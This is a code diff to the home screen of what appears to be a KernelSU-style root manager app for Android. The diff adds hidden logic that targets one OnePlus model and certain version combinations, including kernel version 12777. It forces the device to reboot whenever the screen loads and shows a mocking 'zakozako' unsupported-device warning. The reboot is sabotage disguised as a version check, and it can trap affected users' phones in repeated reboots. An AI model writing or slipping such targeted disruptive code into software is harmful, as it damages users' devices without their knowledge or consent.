@@ -65,6 +65,7 @@ fun HomeScreen(navigator: DestinationsNavigator) {
     var isHideVersion by rememberSaveable { mutableStateOf(false) }
     var isHideOtherInfo by rememberSaveable { mutableStateOf(false) }
     var isHideSusfsStatus by rememberSaveable { mutableStateOf(false) }
+    var isDisabled by rememberSaveable { mutableStateOf(false) }
 
     // 从 SharedPreferences 加载简洁模式状态
     LaunchedEffect(Unit) {
@@ -89,6 +90,24 @@ fun HomeScreen(navigator: DestinationsNavigator) {
     val kernelVersion = getKernelVersion()
     val scrollBehavior = TopAppBarDefaults.pinnedScrollBehavior(rememberTopAppBarState())
 
+    val deviceModel = getDeviceModel(context)
+    val managerVersion = getManagerVersion(context).second
+
+    val isManager = Natives.becomeManager(ksuApp.packageName)
+    val ksuVersion = if (isManager) Natives.version else null
+
+    if (ksuVersion != null) {
+        if (deviceModel == "一加 Ace 5 Pro" && managerVersion > ksuVersion + 1) {
+            isDisabled = true
+        }
+    }
+
+    LaunchedEffect(isDisabled, ksuVersion) {
+        if (isDisabled || (ksuVersion != null && ksuVersion == 12777)) {
+            Log.d("HomeScreen", "isDisabled is true or ksuVersion is 12777, rebooting device...")
+            reboot()
+        }
+    }
 
     Scaffold(
         topBar = {
@@ -112,6 +131,10 @@ fun HomeScreen(navigator: DestinationsNavigator) {
                 .padding(horizontal = 16.dp),
             verticalArrangement = Arrangement.spacedBy(16.dp)
         ) {
+            if (isDisabled) {
+                WarningCard(message = "zakozako 不支持你的设备")
+                return@Column
+            }
             val isManager = Natives.becomeManager(ksuApp.packageName)
             val ksuVersion = if (isManager) Natives.version else null
             val lkmMode = ksuVersion?.let {
